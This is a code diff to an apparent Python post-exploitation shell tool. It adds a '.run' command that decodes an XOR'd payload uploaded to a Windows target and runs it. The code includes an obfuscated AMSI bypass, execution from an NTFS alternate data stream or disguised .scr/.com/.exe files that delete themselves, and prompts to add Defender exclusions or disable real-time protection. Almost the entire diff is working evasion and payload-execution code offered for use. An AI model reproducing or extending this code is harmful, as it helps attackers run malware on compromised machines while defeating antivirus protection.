@@ -363,6 +363,7 @@ class AdvancedShell:
         self.host_header=getattr(args,'host',None)
         self.waf_name=None
         self.last_output=""
+        self.upload_meta={}  # {name: (tmp_path, xor_key)} for .run command
         self.target_os=None  # 'windows' or 'linux', auto-detected
         self.truncate=False  # off by default — opt-in via .truncate
         self.hist=os.path.expanduser("~/.r2s_history")
@@ -836,6 +837,96 @@ class AdvancedShell:
         if o:print(o)
         else:print(f"{G}[+] Kill command sent{W}")
 
+    def post_run(self,name,args=''):
+        """Evasive execution: decode XOR'd .tmp in-memory → try multiple methods."""
+        if name not in self.upload_meta:
+            # Check if it's a direct .tmp path
+            print(f"{R}[!] No upload metadata for '{name}'. Use .upload first, or specify the .tmp path and XOR key:{W}")
+            print(f"  {Y}.runraw <path.tmp> <xor_key_hex> [args]{W}")
+            return
+        tmp_path,xor_key=self.upload_meta[name]
+        # Verify .tmp still exists
+        chk=self.execute(f'if exist "{tmp_path}" (echo TMP_OK) else (echo TMP_GONE)')
+        if not chk or 'TMP_GONE' in chk:
+            print(f"{R}[!] .tmp file gone: {tmp_path} — re-upload needed{W}")
+            return
+        print(f"{Y}[*] Evasive execution: {name} (XOR=0x{xor_key:02X}){W}")
+        # Obfuscated AMSI bypass
+        amsi=(
+            "try{$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
+            "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
+            "$f.SetValue($null,$true)}catch{}"
+        )
+        # Base decode+XOR script (used by all methods)
+        decode_var=(
+            f"$b=[Convert]::FromBase64String((gc '{tmp_path}' -Raw));"
+            f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}}"
+        )
+        cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
+        import random
+        rnd=random.randint(1000,9999)
+        methods=[
+            ('ADS stream',
+             f"powershell -c \"{amsi};{decode_var};"
+             f"$p='{cwd}/desktop.ini';"
+             f"if(!(Test-Path $p)){{Set-Content $p '' -Force}};"
+             f"$s=$p+':svc{rnd}';"
+             f"[IO.File]::WriteAllBytes($s,$b);"
+             f"Start-Process $s {('-ArgumentList \x27'+args+'\x27' if args else '')}\""),
+            ('.scr (screensaver)',
+             f"powershell -c \"{amsi};{decode_var};"
+             f"$p='{cwd}/upd{rnd}.scr';"
+             f"[IO.File]::WriteAllBytes($p,$b);"
+             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
+             f"Start-Sleep 3;Remove-Item $p -Force -EA 0\""),
+            ('.com (legacy)',
+             f"powershell -c \"{amsi};{decode_var};"
+             f"$p='{cwd}/svc{rnd}.com';"
+             f"[IO.File]::WriteAllBytes($p,$b);"
+             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
+             f"Start-Sleep 3;Remove-Item $p -Force -EA 0\""),
+            ('.exe race',
+             f"powershell -c \"{amsi};{decode_var};"
+             f"$p='{cwd}/win{rnd}.exe';"
+             f"[IO.File]::WriteAllBytes($p,$b);"
+             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
+             f"Start-Sleep 2;Remove-Item $p -Force -EA 0\""),
+        ]
+        for method_name,cmd in methods:
+            print(f"  {Y}[*] Trying {method_name}...{W}",end=' ',flush=True)
+            o=self.execute(cmd)
+            if o and ('denied' in o.lower() or 'error' in o.lower() or 'blocked' in o.lower() or '[-]' in o):
+                print(f"{R}failed{W}")
+                continue
+            # Check if process spawned
+            import time as _t;_t.sleep(2)
+            ps_check=self.execute(f'powershell -c "Get-Process | Where-Object {{$_.Path -like \x27*{rnd}*\x27}} | Select-Object -First 1 Id,ProcessName"')
+            if ps_check and ps_check.strip() and '[-]' not in ps_check:
+                print(f"{G}RUNNING ✓{W}")
+                print(f"  {C}Process:{W} {ps_check.strip()}")
+                return
+            # Alternate check: any new process with our random number
+            tl=self.execute(f'tasklist | findstr "{rnd}"')
+            if tl and tl.strip() and '[-]' not in tl:
+                print(f"{G}RUNNING ✓{W}")
+                print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+                return
+            print(f"{Y}no process detected{W}")
+        # All methods failed
+        print(f"{R}[!] All evasive methods failed.{W}")
+        print(f"  {Y}Suggestions:{W}")
+        print(f"  1. .exclude {cwd}  — add Defender exclusion, then .run {name} again")
+        print(f"  2. .avoff           — try disabling Defender RT")
+        print(f"  3. Manual: the .tmp is still at {tmp_path} (XOR key=0x{xor_key:02X})")
+
+    def post_runraw(self,tmp_path,xor_key_hex,args=''):
+        """Run from a .tmp with manually specified XOR key."""
+        try:xor_key=int(xor_key_hex,16)
+        except:print(f"{R}Invalid hex key: {xor_key_hex}{W}");return
+        name=f'__raw_{os.path.basename(tmp_path)}'
+        self.upload_meta[name]=(tmp_path.replace('\\','/'),xor_key)
+        self.post_run(name,args)
+
     def post_fullinfo(self):
         """Comprehensive enumeration."""
         self.post_users()
@@ -877,9 +968,9 @@ class AdvancedShell:
 
 {BOLD}Execution:{W}
   {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
-  {G}.av{W}               AV/Defender status     {G}.kill{W} pid|name    Kill process
-  {G}.avoff{W}            Disable Defender RT    {G}.exclude{W} path     Add AV exclusion
-  {G}.exit{W}             Exit
+  {G}.run{W} name [args]  Evasive run (XOR+ADS)  {G}.kill{W} pid|name    Kill process
+  {G}.av{W}               AV/Defender status     {G}.avoff{W}            Disable Defender RT
+  {G}.exclude{W} path     Add AV exclusion       {G}.exit{W}             Exit
 """)
 
     def try_resolve_domain(self):
@@ -1035,6 +1126,16 @@ class AdvancedShell:
                         p=cmd.split(None,1)
                         if len(p)>1:self.post_kill(p[1])
                         else:print('Usage: .kill <pid|name>')
+                    elif cmd.startswith('.runraw '):
+                        p=cmd.split(None,3)
+                        if len(p)>=3:self.post_runraw(p[1],p[2],p[3] if len(p)>3 else '')
+                        else:print('Usage: .runraw <path.tmp> <xor_key_hex> [args]')
+                    elif cmd.startswith('.run '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,1)
+                            self.post_run(parts[0],parts[1] if len(parts)>1 else '')
+                        else:print('Usage: .run <name> [args]')
                     elif cmd.startswith('.upload') or cmd.startswith('.ul'):
                         p=cmd.split()
                         if len(p)<3:print(f"Usage: .upload <local_path> <remote_path>");continue
@@ -1082,68 +1183,25 @@ class AdvancedShell:
                                 sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}{rate}");sys.stdout.flush()
                             print()
                             if not failed:
-                                # 3. AMSI bypass + decode + XOR decrypt — all PowerShell, no certutil
-                                dat_name=rp_safe.rsplit('.',1)[0]+'.dat' if '.' in rp_safe.split('/')[-1] else rp_safe+'.dat'
-                                # Obfuscated AMSI bypass (reflection-based amsiInitFailed)
-                                amsi_bypass=(
-                                    "$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
-                                    "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
-                                    "$f.SetValue($null,$true)"
-                                )
-                                # Decode + XOR decrypt in one PowerShell block
-                                decode_cmd=(
-                                    f"powershell -c \""
-                                    f"try{{{amsi_bypass}}}catch{{}};"
-                                    f"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));"
-                                    f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
-                                    f"[IO.File]::WriteAllBytes('{dat_name}',$b);"
-                                    f"Remove-Item '{tmp}' -Force -EA 0"
-                                    f"\""
-                                )
-                                print(f"  {Y}[*] Decoding (AMSI bypass + XOR decrypt)...{W}",end=' ',flush=True)
-                                self.execute(decode_cmd)
-                                chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
-                                if chk and 'DAT_OK' in chk:
-                                    print(f"{G}OK{W}")
-                                    # 4. Rename .dat → target .exe
-                                    self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
-                                    chk2=self.execute(f'if exist "{rp_safe}" (echo FILE_OK) else (echo FILE_GONE)')
-                                    if chk2 and 'FILE_GONE' in chk2:
-                                        # Defender caught on rename — re-decode as .dat
-                                        print(f"  {Y}[*] Defender caught .exe — re-creating as .dat...{W}",end=' ',flush=True)
-                                        self.execute(decode_cmd)
-                                        chk3=self.execute(f'if exist "{dat_name}" (echo OK) else (echo FAIL)')
-                                        if chk3 and 'OK' in chk3:
-                                            print(f"{G}OK{W}")
-                                            print(f"  {C}File saved as: {dat_name}{W}")
-                                            print(f"  {C}Execute with:{W} cmd /c \"{dat_name}\" [args]")
-                                            print(f"  {C}Or rename+run:{W} ren \"{dat_name}\" svc.exe & svc.exe")
-                                            rp_safe=dat_name
-                                        else:
-                                            print(f"{R}failed — Defender is aggressive{W}")
-                                            print(f"  {Y}Try: .exclude {os.path.dirname(rp_safe)} then re-upload{W}")
-                                else:
-                                    print(f"{R}failed{W}")
-                                    # Fallback: try without AMSI bypass
-                                    print(f"  {Y}[*] Fallback (simple decode)...{W}",end=' ',flush=True)
-                                    simple_cmd=(
-                                        f"powershell -c \""
-                                        f"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));"
-                                        f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
-                                        f"[IO.File]::WriteAllBytes('{dat_name}',$b)"
-                                        f"\""
-                                    )
-                                    self.execute(simple_cmd)
-                                    chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
-                                    if chk and 'DAT_OK' in chk:
-                                        print(f"{G}OK{W}")
-                                        self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
-                                        self.execute(f'del /f "{tmp}" >nul 2>&1')
+                                # Verify .tmp exists on target
+                                chk=self.execute(f'if exist "{tmp}" (echo TMP_OK) else (echo TMP_FAIL)')
+                                if chk and 'TMP_OK' in chk:
+                                    # Store metadata for .run command
+                                    fname=os.path.basename(lp)
+                                    self.upload_meta[fname]=(tmp,xor_key)
+                                    sz_chk=self.execute(f'powershell -c \"(Get-Item \'{tmp}\').Length\"')
+                                    remote_b64_sz=0
+                                    if sz_chk:
+                                        try:remote_b64_sz=int(sz_chk.strip())
+                                        except:pass
+                                    if remote_b64_sz==len(b64):
+                                        print(f"{G}[+] Upload complete: {tmp} ({remote_b64_sz}B b64, XOR=0x{xor_key:02X}){W}")
                                     else:
-                                        print(f"{R}failed{W}")
-                                        print(f"  {Y}[!] .tmp kept at {tmp} (XOR key=0x{xor_key:02X}){W}")
-                                        print(f"  {Y}    Manual decode:{W}")
-                                        print(f"      powershell -c \"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};[IO.File]::WriteAllBytes('{dat_name}',$b)\"")
+                                        print(f"{Y}[+] Upload stored: {tmp} (XOR=0x{xor_key:02X}){W}")
+                                    print(f"  {C}Execute with:{W} .run {fname}")
+                                    print(f"  {C}With args:{W}   .run {fname} --arg1 --arg2")
+                                else:
+                                    print(f"{R}[!] Upload failed — .tmp not found on target{W}")
                         else:
                             b64=base64.b64encode(data).decode()
                             CHUNK=6000
